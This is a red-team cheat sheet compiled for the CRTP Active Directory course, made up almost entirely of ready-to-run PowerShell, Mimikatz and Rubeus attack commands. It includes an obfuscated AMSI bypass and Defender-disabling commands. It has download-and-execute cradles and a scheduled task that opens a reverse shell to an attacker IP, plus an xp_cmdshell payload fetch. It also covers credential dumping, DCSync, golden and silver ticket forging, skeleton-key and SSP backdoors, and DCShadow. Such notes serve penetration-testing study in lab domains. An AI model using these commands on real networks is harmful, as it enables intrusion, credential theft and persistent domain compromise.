# Certified Read Team Professional (CRTP) - Cheatsheet 

 **Name** : **CRTP - Active Directory Command Cheat Sheet (Powershell)**
 
 **Course Link** : https://www.alteredsecurity.com/adlab

 **Compiled By** : **Nikhil Raj ( Twitter: https://twitter.com/0xn1k5 | Blog: https://organicsecurity.in )**

 **Version: 1.0**
 
 **Last Updated** : 23 Sep 2022

 **Disclaimer** : This cheat sheet has been compiled from multiple sources with the objective of aiding fellow pentesters and red teamers in their learning. The credit for all the tools and techniques belongs to their original authors. I have added a reference to the original source at the bottom of this document.  


# AV Evasion

**Disable MS Defender**

- Bypass the execution policy

  ```powershell
  powershell -ep Bypass

- Disable AV using powershell (Requires Local Admin rights)

  ```powershell
  Get-MPPreference
  Set-MPPreference -DisableRealTimeMonitoring $true
  Set-MPPreference -DisableIOAVProtection $true
  Set-MPPreference -DisableIntrusionPreventionSystem $true

- Bypass AMSI Check (If Admin rights are not available)
  ```powershell
  S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

- Download and save the file on disk

  ```powershell
  iwr http://192.168.100.XX/rubeus.exe -outfile rubeus.exe

- Download and execute cradle (Files can be hosted using HFS.exe or Python Webserver)

  ```powershell
  iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/PowerView.ps1')
  iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/Invoke-Mimikatz.ps1')
  iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/mimilib.dll')
  iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/Set-RemotePSRemoting.ps1')
  iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/Set-RemoteWMI.ps1')
  iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/MS-RPRN.exe')
  iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/Rubeus.exe')
  iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/Add-RemoteRegBackdoor.ps1')
  iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/Find-PSRemotingLocalAdminAccess.ps1')
  iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/Find-WMILocalAdminAccess.ps1')

# Enumeration

**Domain Enumeration**

- Get Basic Information about Domain
  ```powershell
  Get-NetDomain

- Find the SID of the current Domain
  ```powershell
  Get-DomainSID

- Find the policy applicable to current domain
  ```powershell
  Get-DomainPolicy
  (Get-DomainPolicy)."Kerberos Policy"

- Find the DC Servers in current Domain
  ```powershell
  Get-NetDomainController
  Get-NetDomainController -Forest OrganicSecurity.local

- Enumerate Domain OU
  ```powershell
  Get-NetOU -FullData


**User, Group & Computer Object**

- Enumerate the Information about the Domain Users

  ```powershell
  Get-NetDomainUser

- Search the user attributes for specific terms

  ```powershell
  Find-UserField -SearchField Description -SearchTerm "Password"

- Find all the groups on the Current Domain

  ```powershell
  Get-NetGroup
  Get-NetGroup -Recurse

- Find Group Membership

  ```powershell
  Get-NetGroupMember -GroupName "EnterPrise Admins" -Domain "OrganicSecurity.local"

- Find local group created on the servers (requires admin rights for checking on non-dc machines)

  ```powershell
  Get-NetLocalGroup -Computername <dc>

- Get the list of Computer Objects

  ```powershell
  Get-NetComputer

**Shares & Juicy Files**

- Identify the shares in current domain

  ```powershell
  Invoke-ShareFinder

- Identify juicy files accessible over the shared folder

  ```powershell
  Invoke-FileFinder

- Find File servers in current domain

  ```powershell
  Get-FileNetServer

- Find hardcoded Password via Group Policy Preference  

  ```powershell
  findstr /S /I cpassword \\dc.organicsecurity.local\sysvol\organicsecurity.local\policies\*.xml

- Decrypt the GPP Password identified in previous step (https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)

  ```powershell
  Get-DecryptedCpassword


**User Hunting**

- Find session of logged on users on the server

  ```powershell
  Get-NetLoggedOn <computer-name>
  (Get-NetComputer -FullData).foreach({Get-NetLoggedOn $_.cn})

- Find last logged on user on the remote machine

  ```powershell
  Get-LastLoggedOn -ComputerName <servername>

- Find all the local admin accounts on all the machines (Required Admin rights on non-dc machines)

  ```powershell
  Invoke-EnumerateLocalAdmin | select ComputerName, AccountName, IsDomain, IsAdmin

- Find Local Admin rights for current user

  ```powershell
  Find-LocalAdminAccess
  Invoke-CheckLocalAdminAccess
  Invoke-CheckLocalAdminAccess -ComputerName <server_fqdn>

- Find the computers where Domain Admin or specified User/Group has active session

  ```powershell
  Invoke-UserHunter

- "stealth" option only checks for session on only High Value Servers

  ```powershell
  Invoke-UserHunter -stealth

- Check for Powershell Remoting access for current user

  ```powershell
  Find-PSRemotingLocalAdminAccess -ComputerName <server_fqdn>

- Check for Remote Access via WMI for current user

  ```powershell
  Find-WMILocalAdminAccess -ComputerName <server_fqdn>


**GPO Enumeration**

- Find all the GPO configured in a given domain

  ```powershell
  Get-NetGPO | select displayname
  Get-NetGPO -ComputerName <server_fqdn>

- Find the GPOs applied on a specific OU in the domain

  ```powershell
  Get-NetOU -FullData | select ou,pglink
  Get-NetGPO -GPOName "{GPO_ID}"


- Find If there is GPO configured which is using Restricted Groups via groups.xml to assign local admin membership

  ```powershell
  Get-NetGPOGroup

- Find machines where the given user is member of a specific group

  ```powershell
  Get-GPOLocation -UserName <username> 


**Access Control Model (ACL)**

- Fetch all the ACL associated with a given user account

  ```powershell
  Get-ObjectAcl -SamAccountName <username> | select AccessControlType, IdentityReference, ActiveDirectoryRights

- Fetch all the ACL by ADSPath for any AD Object

  ```powershell
  Get-ObjectAcl -ADSPath "LDAP://CN={73267-86872-368732},CN=Policies,CN=System,DC=organicsecurity,DC=local"

- Fetch all the ACL by ADSPrefix 
  ```powershell
  Get-ObjectAcl -ADSPrefix "CN=Administrator,CN=Users"

- Use below command to find all the interesting ACEs

  ```powershell
  Invoke-ACLScanner | select AccessControlType, IdentityReference, ActiveDirectoryRights, ObjectDN

- Identify the ACL associated with the specified path

  ```powershell
  GetPathAcl -Path "\\dc.organicsecurity.local\sysvol"

**Forest & Domain Trusts**

- Enumerate Trust of current domain

  ```powershell
  Get-NetDomainTrust

- Enumerate Current Forest, and its domain

  ```powershell
  Get-NetForest
  Get-NetForest -Forest organicsecurity.local

- Enumerate all the domains under given forest

  ```powershell
  Get-NetForestDomain

- Find the Global Catalouge for given forest

  ```powershell
  Get-NetForestCatalog

- Find the forest trust

  ```powershell
  Get-NetForestTrust -Forest organicsecurity.local

**BloodHound & SharpHound**

- Install neo4j service
  
    ```powershell
  .\neo4j.bat install-service
  net start neo4j

  . .\Sharhound.ps1
  Invoke-BloodHound -CollectionMethod All


# PrivEsc - Misconfiguration & Feature Abuse

- Escalate privilege on local system to gain Admin rights
	- PowerUp : https github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
	- BeRoot : https:// github.com/AlessandroZ/BeRoot
  - Privesc : https:// github.com/enjoiz/Privesc

- **PowerUp**

  ```powershell
  Get-ServiceUnquoted
  Invoke-AllChecks

  Invoke-ServiceAbuse -Name 'Sevice Name'


- **Jenkins**

  ```powershell
  .\nc64.exe -l -p 443

  schtasks /create /S dc.organicsecurity.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "Job01" /TR "powershell.exe -c 'iex ( iwr http://192.168.100.XX/dakiya.ps1  -UseBasicParsing); Dakiya -Reverse -IPAddress 192.168.100.YY -Port 443'"

  schtasks /Run /S dc.organicsecurity.local /TN "Job01"

  schtasks /Query /S dc.organicsecurity.local 


# Lateral Movement & Persistance

- Execute command using powershell remoting 
  
  ```powershell
  $sess = New-PSSession -ComputerName <computer/list_of_servers>
  Enter-PSSession -$sess

  Enter-PSSession -ComputerName <server_name>

  Invoke-Command -Scriptblock {Get-Process} -ComputerName <computer>
  Invoke-Command -Scriptblock ${function:Get-Process} -ComputerName <computer>
  Invoke-Command -FilePath <script.ps1> -ComputerName <Get-Content computers.txt>


**Mimikatz Cheatsheet**

- Default Command
  ```powershell
  Invoke-Mimikatz
  Invoke-Mimikatz -DumpCreds
  Invoke-Mimikatz -DumpCreds -ComputerName <comp>

- Use Mimikatz with PowerShell Remoting
  ```powershell
  Invoke-Command -FilePath invoke-mimikatz.ps1 -Session $sess  

- Dump credentials from memory (lsass.exe)
  ```powershell
  Invoke-Mimimatz -Command '"sekurlsa::logonpasswords"'
  Invoke-Mimimatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

- Dump credentials from local SAM account (Contains DSRM Admin creds) & LSA (conatins details from ntds.dat)
  ```powershell
  Invoke-Mimimatz -Command '"lsadump::sam"'
  Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc

- Dump credentials from windows vault

  ```powershell
    Invoke-Mimimatz -Command '"token::elevate" "vault::list"'
    Invoke-Mimimatz -Command '"token::elevate" "vault::cred /patch"'

- Perform DCSync Attacks (Requires DA Rights) [Mention user in domain\user format only ]
  ```powershell
  Invoke-Mimimatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local"'

- Perform PassTheHash (PTH) Attacks (Requires Elevated Shell Access; "RunAs Administrator")
  ```powershell
  Invoke-Mimimatz -Command '"sekurlsa::pth /user:Administrator /domain:organicsecurity.local /ntlm:c10c9ac42937a938c0ca8faf0af0af02 /run:powershell.exe"'

- Use the KRBTGT Hash to craft Golden Ticket (TGT)
  ```powershell

  Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:organicsecurity.local /sid:S-1-5-21-181111131-32111163-5111111 /krbtgt:c10c9ac42937a938c0ca8faf0af0af02 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ticket:golden_tkt.kirbi"'

  Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:organicsecurity.local /sid:S-1-5-21-181111131-32111163-5111111 /krbtgt:c10c9ac42937a938c0ca8faf0af0af02 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

- Import the golden ticket into the memory

  ```powershell
  Invoke-Mimikatz -Command '"kerberos::ptt golden_tkt.kirbi"'

- Crafting Silver Ticket (TGS) for CIFS Service (Requires service account creds/ machine account)

  ```powershell
  Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:organicsecurity.local /sid:S-1-5-21-182222111-321222112-53222211 /rc4:ff46a932423423427602342346f35 /target:dc.organicsecurity.local /service:CIFS/dc.organicsecurity.local /ptt"'

  ls \\organicsecurity.local\c$

  NOTE: HOST - Scheduled Task | HOST + RPCSS - PowerShell remoting & WMI | LDAP - DCSync

- Perform Skeleton Key based persistance attack (Use Mimikatz as default password for all account)

  ```powershell
  Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc

- Backdoor SSP on DC to log credentials in cleartext in log file (c:\windows\system32\kiwissp.log)

  ```powershell
  $packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'

  $packages +="mimilib"
  
  Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
  Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $packages

    OR

  Invoke-Mimikatz -Command '"misc::memssp"'

**Read Protected file from the disk**

- Read NTDS.dit file (Only on DC, Containes the credentials of the AD Users)

  ```powershell
  Invoke-NinjaCopy C:\Windows\System32\ntds.dit C:\ntds.dit

**Read Protected file from the disk**

  - Identify the Applocker Policy to bypass the contrained jail shell 

    ```powershell
    Get-AppLockerPolicy -Effective  | select -ExpandProperty RuleCollections

**AdminSDHolder**

- Get the ACLs defines on the AdminSDHolder object

  ```powershell
  Get-ObjectAcl -ADSprefix "CN=AdminSDHolder,CN=System" -ResolveGUIDs | select AccessControlType, IdentityReference, ActiveDirectoryRights

- Assign GenericAll rights to current (User01) account on AdminSDHolder container

  ```powershell
  Add-ObjectAcl -TargetADSprefix "CN=AdminSDHolder,CN=system" -PrincipalSamAccountName User01 -Rights All -verbose

- Assign ResetPassword rights to (User01) account on AdminSDHolder container

  ```powershell
  Add-ObjectAcl -TargetADSprefix "CN=AdminSDHolder,CN=System" -PrincipalSamAccountName student379  -Rights ResetPassword -verbose

  Set-DomainUserPassword -Identity testuser -AccountPassword (ConvertTo-SecureString "Pass@123" -AsPlainText -Force) -Verbose

- Check if "User01" has any ACL set on "Domain Admins" group 

  ```powershell
  Get-ObjectAcl -SamAccountName "Domain Admins"  | ?{$_.IdentityReference -like "*User01*"}

- Assign DCSync right to "User01" on the current domain
  ```powershell
  Add-ObjectAcl -TargetADSpath "DC=dollarcorp,DC=moneycorp,DC=local" -PrincipalSamAccountName User01 -Rights DCSync -Verbose

- Assign Full rights to the root domain

  ```powershell
  Add-ObjectAcl -TargetADSpath "DC=dollarcorp,DC=moneycorp,DC=local" -PrincipalSamAccountName User01 -Rights ALL -Verbose

**ACL - Security Descriptors & Remote Registry**  

  - Add remote registery backdoor to access the DC without admin rights

    ```powershell
    Add-RemoteRegBackdoor -ComputerName dcorp-dc -user orangesecurity\user01
    Get-RemoteMachineAccountHash -Computer dcorp-dc -verbose
    Get-RemoteLocalAccountHash -Computer dcorp-dc -verbose
    Get-RemoteCachedCredential -Computer dcorp-dc -verbose

# Domain Privilege Escalation

**Kerberosting**

  - Identify the user/service accounts vulnerable to kerberosting attack

    ```powershell
    Get-NetUser -spn | select cn, samaccountname, serviceprincipalname

  - Method 1: Fetch TGS of the vulnerable account (SPN name should match extactly as in the user attribute)

    ```powershell
    .\Rubeus.exe kerberoast /spn:"MSSQLSvc/sqlserver.organicsecurity.local:1433" /user:dcorp\sqladmin /domain:organicsecurity.local /dc:dc.organicsecurity.local  format:hashcat /outfile:mssqlsvc_tgs.hash

    Get-DomainSPNTicket -SPN "MSSQLSvc/dcorp-mgmt.organicsecurity.local" -OutputFormat Hashcat

  - Crack the kerberost hash using Hashcat utility
    ```powershell
    hashcat.exe -a 0 -m 13100 sql_kerb.txt 500-worst-passwords.txt


  - Method 2: Extract TGS from memory and crack it using tgsrepcrack
    ```powershell
    Get-NetUser -SPN | Request-SPNTicket
    klist
    Invoke-Mimikatz -Command '"kerberos::list /export"'
    .\tgsrepcrack.py .\10k-worst-pass.txt .\tickets\7-40a10000-sqluser@MSSQLSvc~sqlserver.dc.organicsecurity.local.kirbi


**Targetted Kerberosting**

  - Find the account having write privileges for current user

    ```powershell
    Invoke-ACLScanner  -ResolveGUID | ?{$_.IdentityReferencename -like "*user01"}
    Invoke-ACLScanner  -ResolveGUID | ?{$_.IdentityReferencename -like "rdpusers"}

  - Perform targetted SPN, where the current user has GenericAll or Write Property privilege

    ```powershell
    Set-DomainObject -Identity testuser01 -Set @{serviceprincipalname='ops/test'}


**ASREP-Roasting**

  - Enumerate user account where Kerberos Preauth is disabled
	
    ```powershell
    Get-DomainUser -PreauthNotRequired -Verbose

  - Method 1: Fetch the AS-REP Response using Rubeus

    ```powershell
    .\Rubeus.exe asreproast
    .\Rubeus.exe asreproast /format:hashcat /user:user01 /outfile:hash.txt
    .\Rubeus.exe asreproast /format:hashcat /outfile:hash.txt

  - Method 2: Use ASREPRoast Powershell script 

    ```powershell
    . .\ASREPRoast.ps1
    Get-ASREPHash -UserName vpn379user

  - Crack the hash using Hashcat
    ```powershell
    hashcat.exe -a 0 -m 18200 asrep-roast.txt 500-worst-passwords.txt 


**Targeted ASREP-Roasting**

  - Determine if the current user has permission to set User Account Control flag for another user

    ```powershell
    Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -like 'S-1-5-21-37422221-831111-1111111-1*'}
    Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'User01'}

  - Set the UserAccountControl bit to disable kerberos preauth for given account  

    ```powershell
    Set-DomainObject -Identity User01 -XOR @{useraccountcontrol=4194304}


# Delegation

**Unconstrained Delegation**

  - Identify Computer Objects where Unconstrained Delegation is allowed

    ```powershell
    Get-NetComputer -Unconstrained | select cn

      Note: 
      
      1) Use bloodhound to identify the attack path to compromise the Computer where unconstrained delegation is allowed. Also, you can find out the user account who has local admmin rights on the given system

      2) Wait for DA user to login, and dump the cached TGT ticket for high privileged user using Mimikatz

      3) Alternately, if there is Print Sppoler service installed on DC, it can be expoited to capture NTLM hash of DC machine account. It can be further used to craft Silver ticket for given service

**Print Spooler attack**

  - Checked Print Service is running on the DC

    ```powershell
    dir \\dc.organicsecurity.local\pipe\spoolss

  - Execute the Rubeus.exe for continues monitoring of TGT/TGS tickets

    ```powershell
    .\Rubeus.exe monitor /interval:2 /nowrap

  - Execute MSRPRN.exe to trigger printspooler server iinto authenticating with our conpromised server having unconstrained delegation enabled to capture DC machine account hash

    ```powershell
    .\ms_rprn.exe \\dc.organgesecurity.local \\appserver.organicsecurity.local

**Constrained Delegation**

  - Identify the user and computer account having constrained delegation enabled

    ```powershell
    Get-NetUser -TrustedToAuth | select cn, samaccountname, msds-allowedtodelegateto
    Get-NetComputer -TrustedToAuth | select cn, msds-allowedtodelegateto

**[I] Constrained Delegation - User/Service Account**

  - Method 1: User Account exploitation using Kekeo

    - Request a TGT for for vulnerable account using NTLM hash

      ```powershell
      .\Kekeo.exe tgt::ask user:websvc /domain:organicsecurity.local /rc4:cc096515667862789729156f
    
    - Use the TGT to fetch delegable TGS for second service 

      ```powershell
      .\kekeo.exe tgs::s4u /tgt:TGT_websvc@organicsecurity.local_krbtgt~organicsecurity.local@organicsecurity.local.kirbi /user:Administrator@organicsecurity.local /service:cifs dcorp mssql.organicsecurity.local
    
    - Inject the ticket into memory using Mimikatz

      ```powershell
      Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@organicsecurity.local@organicsecurity.local_cifs~dcorp-mssql.organicsecurity.local@organicsecurity.local.kirbi"'
    
    - Access the CIFS Service 

      ```powershell
      dir \\dcorp-dc.organicsecurity.local

  - Method 2: User Account exploitation using Rubeus

  	- Use Rubeus to directly fetch TGS for delegated service in single command

      ```powershell
      .\Rubeus.exe s4u /user:websvc /rc4:cc098f204c892347832947324749156f
      /impersonateuser:Administrator /msdsspn :"dcorp_mssql.organicsecurity.local" /ptt

    - Access the CIFS Service 

      ```powershell
      dir \\dcorp-dc.organicsecurity.local


**[II] Constrained Delegation - Machine Account**


  - Method 1: Machine Account exploitation using Kekeo 

    - Similar to above scenario, we can use the NTLM hash of machine account to request TGT 

      ```powershell
      kekeo tgt::ask /user:dcorp adminsrv /domain:organicsecurity.local /rc4:1fadb1b13232132323389e6f34c67
    
    - Use TGT received above to request for TGS. Now, here we can request TGS for service which are not listed under msds-allowedto delegateto but is running under the same service/system account 
    
      ```powershell
      kekeo tgs::s4u /tgt:TGT_dcorp-adminsrv$ @organicsecurity.local_krbtgt~organicsecurity.local@organicsecurity.local.kirbi /user:Administrator@organicsecurity.local /service:time/dcorp-dc.organicsecurity.local | ldap dcorp-dc.organicsecurity.local
    
    - Inject the TGS ticket and perform DCSync attack

      ```powershell
      Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@organicsecurity.local@organicsecurity.local_ldap~dcorp-dc.organicsecurity.local@organicsecurity.local_ALT.kirbi"'
    
      Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt "'


  - Method 2: Machine Account exploitation using Rubeus  

      - Request the TGS for alternate service (not listed in delegation attribute)
      
        ```powershell
        .\Rubeus.exe s4u /user:dcorp-adminsrv$ /rc4:1fadb134234234e6f34c67 /impersonateuser:Administrator /msdsspn:"time/dcorp.dc.organicsecurity.local" /altservice:ldap /ptt

      - Use it to perform DCSync attack

        ```powershell
        Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

# Privilege Escation - Domain Trusts


**CASE 1: Within Forest: Escalating from Child Domain to Root Domain**


A) Escalating from child domain to parent/root domain using Trust key/ticket

  - Step 1: Fetching the Trust keys between child and parent domain

    ```powershell
    Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
    Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'

  - Step 2: Crafting the Inter-realm-TGT ticket

    ```powershell
    Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:organicsecurity.local /sid:SID_OF_CURRENT_DOMAIN /sids:SID_OF_ENTERPRISE_ADMINS_FROM_PARENT_DOMAIN  /rc4:TRUST_KEY /service:krbtgt /target:mango.local /ticket:trust_tkt.kirbi"'

    Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:organicsecurity.local /sid:S-1-5-21-1874506631-3219952063-538504511  /sids:S-1-5-21-280534878-1496970234-700767426-519  /rc4:c04dfec49ae75f81d9ff849e4c4f5be9 /service:krbtgt  /target:moneycorp.local /ticket:trust_orangesecurity_tgt.kirbi"'

  - STEP 3: Use the Inter-Realm TGT to fetch TGS for given service from another forest

    ```powershell
    .\Rubeus.exe asktgs /ticket:trust_Dollar2moneycorp_tgt.kirbi /service:CIFS/mcorp-dc.moneycorp.local  /dc:mcorp-dc.moneycorp.local  /ptt

  - STEP 4: Access the CIFS service from another forest

    ```powershell
    ls \\mcorp-dc.moneycorp.local\c$



B) Escalating from child domain to parent/root domain using KRBTGT Hash

  - STEP 1: Fetch the NTLM hash of KRBTGT Account 
  
    ```powershell
    Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

  - STEP 2: Use it to craft the Golden ticket with SID set to Enterprise Admin

    ```powershell
    Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:organicsecurity.local /sid:SID_OF_CURRENT_DOMAIN /sids:SID_OF_ENTERPRISE_ADMINS_FROM_PARENT_DOMAIN  /krbtgt:krbtgt_ntlm_hash  /target:moneycorp.local /ticket:trust_tkt.kirbi"'

    Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:organicsecurity.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519  /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /target:mango.local  /ticket:trust_organicsecurity_golden_tgt.kirbi"'

  - STEP 3: Inject the ticket into the memory

    ```powershell
    Invoke-Mimikatz -Command '"kerberos::ptt trust_organicsecurity_golden_tgt.kirbi"'



C) Stealthier Method for creating Golden ticket using DC Account    

  - STEP 1: Fetch the NTLM hash of krbtgt account

  - STEP 2: Use mimikatz to craft TGT ticket with SIDS set to Domain Controllers & EnterPrise DC

    ```powershell
  	Invoke-Mimikatz -Command '"Kerberos::golden /user:DCORP-DC$/domain:dollarcorp.moneycorp.local /sid:SID_OF_CURRENT_DOMAIN /sids:SID_OF_DOMAIN_CONTROLLERS_ENTERPRISE_DC_FROM_PARENT_DOMAIN  /krbtgt:krbtgt_ntlm_hash  /target:moneycorp.local /ticket:trust_tkt.kirbi"'
	
    Invoke-Mimikatz -Command '"Kerberos::golden /user:DCORP-DC$ /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /target:moneycorp.local  /ticket:trust_stealth_tkt.kirbi"'




**CASE II: Privilege Escalation from one forest to other Forest (SID Filtering is enabled for external and forest level trust)**

  - STEP 1: Identify if there is trust between current domain and foreign forest

    ```powershell
    Get-NetDomainTrust

  - STEP 2: Fetch the Trust Keys of the external or forest level trust

    ```powershell
  	Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
    Invoke-Mimikatz -Command '"lsadump::trust /patch"'

  - STEP 3: Use the Trust Key to craft a TGT 

    ```powershell
    Invoke-Mimikatz -Command '"kerberos::golden /user:administrator  /domain:organicsecurity.local /sid:S-1-5-21-223322223-11111111-538504511  /rc4:d98c9dc732432432432f58a /service:krbtgt /target:anotherdomain.local /ticket:apple_trust_tkt.kirbi"'

  - STEP 4: Inject the ticket back into the memory

    ```powershell
    Invoke-Mimikatz -Command '"kerberos::ptt eurocorp_trust_tkt.kirbi"'

  - STEP 5: Request a TGS for CIFS Service on the DC of AnotherForest Domain (Possible to create TGS for other service as well like HOST,RPCSS,LDAP etc)
    
    ```powershell
    .\Rubeus.exe asktgs /ticket:eurocorp_trust_tkt.kirbi /service:CIFS/eurocorp-dc.eurocorp.local  /dc:eurocorp-dc.eurocorp.local  /ptt


  - STEP 6: Further, we can scan the ACL of the AD Objects in another forest to identify any Foreign Group Membership and ACLs which may allow the user in current domain access to specific services in another domain:

    - Scenario 1: Local Group Membership - Find if the users from current domain is member of group in another forest/domain

      ```powershell
      Get-NetLocalGroupMember <server>

    - Scenario 2: Foreign Group Membership - Find users from foreign domain having membership in current AD groups. They show in "ForeignSecurityPrincipals" container of domain

       ```powershell
       Get-DomainObject -Domain organicsecurity.local -LDAPFilter '(ObjectClass=ForeignSecurityPrincipals)'
       Get-DomainForeignGroupMember -Domain <target.domain.fqdn>
       Get-DomainForeignUser -Domain <target.domain.fqdn>

    - Scenario 3: Foreign ACL Principals - Find the ACEs applied on ad objects where the security identifier is not set to the domain being queried, or set to the domain you are currently having access. 

      ```powershell
      Get-DomainObjectACL -Domain <domain.fqdn>
      Get-DomainObjectAcl -Domain eurocorp.local | ?{$_.SecurityIdentifier -like "S-1-5-21-234345438-14223333-702334436*"} | select ObjectDN, ActiveDirectoryRights, AceType, SecurityIdentifier



# TrustAbuse - MSSQL using PowerUp SQL

  - Identifying all the MSSQL Database Servers in the current domain (searches domain by MSSQL SPN in computer object)

    ```powershell
    Get-SQLInstanceDomain

  - Check if the current logged-on user has access to SQL Database

    ```powershell
    Get-SQLConnectionTestThreaded

  - Gather More Information about the SQL Database (Only Accessible DBs)

    ```powershell
    Get-SQLInstanceDomain | Get-SQLServerInfo

  - Invoke audit checks on the accessible DB Service to identify the vulnerabilities and misconfigurations

    ```powershell
    Invoke-SQLAudit -Instance <server_fqdn>

  - Invoke automated abuse of the vulnerabilities 

    ```powershell
    Invoke-SQLEscalatePriv -Instance <server_fqdn>

  - Identify the DB Links

    ```powershell
    Get-SQLServerLink -Instance dcorp-mssql.organicsecurity.local   

  - Execute commands using xp_cmdshell via DB Links

    ```powershell
    Get-SQLServerLinkCrawl -Instance dcorp-mssql.organicsecurity.local  -Query "exec master..xp_cmdshell 'whoami'"

  - Gain Remote Shell using xp_cmdshell via DB Links
  
    ```powershell
    Get-SqlServerLinkCrawl -Instance DCORP-MSSQL -Query 'EXEC xp_cmdshell "powershell.exe -c iex (new-object net.webclient).downloadstring(''http://172.16.100.79/dakiya.ps1'')"' | select instance,links,customquery | ft
    ```

  - Enumerating DB Links manually 

    ```sql
    select * from master.. sysservers;
    select * from openquery ("dcorp-sql1",'select * from master.. sysservers');
    select * from openquery ("dcorp-sql1",'select * from openquery ("dcorp-sql2",''select * from master..sysservers'')');
    select * from openquery ("dcorp-sql1",'select * from openquery ("dcorp-sql2",''select * from openquery ("pcorp-sql3.organicsecurity.local",''''select * from master.. sysservers'''')'')');
    select * from openquery ("dcorp-sql1",'select * from openquery ("dcorp-sql2",''select * from openquery ("pcorp-sql3.organicsecurity.local",''''select @@version'''')'')');
    ```

  - Command to enable xp_cmdshell if not enabled:

    ```sql
    EXECUTE sp_configure 'xp_cmdshell', 1; 
    ```

# DC shadow

  - Update Description, SIDHistory and GroupID 
	
    ```powershell
    lsadump::dcshadow /object:root01 /attribute:Description /value="Hello from DCShadow"
    
    lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-5-21-280534878-1496970234-700767426-519
    
    lsadump-dcshadow /object:student1 /attribute:primaryGroupID /value:519

    lsadump::dcshadow /push
	
  - Modify ntSecurityDescriptor for AdminSDHolder to add full control to current user
	
    ```powershell
    (New-Object System.DirectoryServices.DirectoryEntry (("LDAP://CN=Admin 
    SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl
	
    lsadump-dcshadow /object:CN=AdminSDHolder,CN=System,DC=organicsecurity,DC=local /attribute:ntSecurityDescriptor /value:<modified ACL>
	
  - Alternatively, we can use Set-DCShadowPermissions from Nishang
	
    ```powershell
	  Set-DCShadowPermissions -FakeDC mcorp-student1 -SAMAccountName root1user -Username student1 -Verbose

  
# References

- https://www.pentesteracademy.com/activedirectorylab
- https://www.alteredsecurity.com/adlab
- https://adsecurity.org/?p=2288
- https://adsecurity.org/?page_id=1821
- https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
- https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1
- https://github.com/samratashok/nishang
- https://blog.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/